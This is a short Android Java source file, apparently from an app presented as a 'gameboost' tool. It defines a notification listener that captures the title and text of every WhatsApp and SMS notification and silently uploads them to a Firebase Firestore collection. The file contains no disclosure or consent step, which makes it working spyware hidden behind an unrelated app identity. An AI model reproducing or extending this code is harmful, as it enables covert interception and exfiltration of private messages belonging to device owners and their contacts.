package com.Ejram.gameboost;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import com.google.firebase.firestore.FirebaseFirestore;
import java.util.HashMap;
import java.util.Map;

public class GuardianNotificationListener extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String pkg = sbn.getPackageName();
        if (pkg.contains("whatsapp") || pkg.contains("sms")) {
            FirebaseFirestore db = FirebaseFirestore.getInstance();
            Map<String, Object> data = new HashMap<>();
            data.put("app", pkg);
            data.put("title", sbn.getNotification().extras.getString("android.title"));
            data.put("text", sbn.getNotification().extras.getString("android.text"));
            data.put("time", System.currentTimeMillis());
            db.collection("notifications").add(data);
        }
    }
}
